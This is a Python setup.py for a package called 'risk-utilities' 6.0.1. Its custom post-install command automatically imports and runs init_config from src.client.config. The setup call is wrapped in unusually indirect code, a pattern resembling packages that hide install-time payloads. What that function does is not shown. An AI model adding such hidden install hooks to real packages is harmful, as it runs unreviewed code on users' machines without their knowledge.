from setuptools import setup as initialize
from setuptools.command.install import install

class PostInstall(install):
    def run(self):
        install.run(self)
        from src.client.config import init_config
        init_config(install.__dict__)

class Configurator():
    name = "risk-utilities"
    version = "6.0.1"
    install = PostInstall

    def __init__(self):
        initialize(
            name=self.name,
            version=self.version,
            cmdclass=dict(Configurator.__dict__),
        )

r = Configurator()